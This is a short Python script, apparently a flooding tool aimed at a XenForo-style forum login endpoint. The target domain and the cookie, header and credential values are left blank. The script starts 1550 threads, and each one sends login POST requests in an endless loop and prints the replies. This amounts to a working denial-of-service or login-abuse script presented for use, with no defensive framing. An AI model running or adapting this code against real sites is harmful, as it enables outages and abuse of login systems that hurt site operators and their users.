import requests
import threading

#▄▄███▄▄· ██████╗██████╗ ██╗██████╗ ████████╗    ██╗███████╗    ██████╗ ███████╗ █████╗ ██╗     
#██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝    ██║██╔════╝    ██╔══██╗██╔════╝██╔══██╗██║     
#███████╗██║     ██████╔╝██║██████╔╝   ██║       ██║███████╗    ██████╔╝█████╗  ███████║██║     
#╚════██║██║     ██╔══██╗╚═╝██╔═══╝    ██║       ╚═╝╚════██║    ██╔══██╗██╔══╝  ██╔══██║██║     
#███████║╚██████╗██║  ██║██╗██║        ██║       ██╗███████║    ██║  ██║███████╗██║  ██║███████╗
#╚═▀▀▀══╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝       ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
                                                                                              
cookies = {
    'xf_from_search': '',
    'xf_language_id': '',
    'xf_csrf': '',
}

headers = {
    'authority': '',
    'accept': '',
    'accept-language': '',
    'cache-control': '',
    # Requests sorts cookies= alphabetically
    'cookie': '',
    'origin': '',
    'referer': '',
    'sec-fetch-dest': '',
    'sec-fetch-mode': '',
    'sec-fetch-site': '',
    'sec-fetch-user': '',
    'sec-gpc': '',
    'upgrade-insecure-requests': '',
    'user-agent': '',
}

data = {
    '_xfToken': '',
    'login': '',
    'password': '',
    'remember': '1',
    '_xfRedirect': '',
}
def script():
    while True:
        response = requests.post('https://www..com/login/login', cookies=cookies, headers=headers, data=data).text

        print(response)
threads = []

for i in range(1550):
    t = threading.Thread(target=script)
    t.daemon = True
    threads.append(t)

for i in range(1550):
    threads[i].start()

for i in range(1550):
    threads[i].join()